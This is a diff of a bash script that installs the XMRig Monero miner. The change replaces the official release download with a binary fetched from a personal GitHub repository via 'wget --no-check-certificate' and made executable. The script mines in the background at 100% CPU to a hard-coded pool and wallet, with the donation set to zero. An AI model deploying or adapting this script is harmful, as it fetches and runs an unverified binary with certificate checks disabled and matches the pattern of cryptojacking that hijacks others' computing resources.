@@ -1,19 +1,16 @@
 #!/bin/bash
 
 # variables
-BASE_URL="https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-static-x64.tar.gz"
+BASE_URL="https://raw.githubusercontent.com/zkysimon/xmr/main/xmrig"
 POOL="pool.minexmr.com:3333"
 WALLET="43K8b6cvTxQSQYBxE5y1uCFRXrmSazVf5fP2T31uZiBWKnyTgGKurgtL7H67TMb2KTPYfjdoJMdve4PTXcUTtyaCUD6YAVY"
 UUID=$(cut -d '-' -f 1 /proc/sys/kernel/random/uuid)
 BACKGROUND=true
-DONATE=1
+DONATE=0
 USEAGE=100
 
-rm -rf xmrig-6.12.1
-rm -rf xmrig-6.12.1-linux-static-x64.tar.gz
 wget --no-check-certificate ${BASE_URL}
-tar -xzvf xmrig-6.12.1-linux-static-x64.tar.gz
-cd xmrig-6.12.1
+chmod +x xmrig
 
 # prepare config
 rm -f config.json
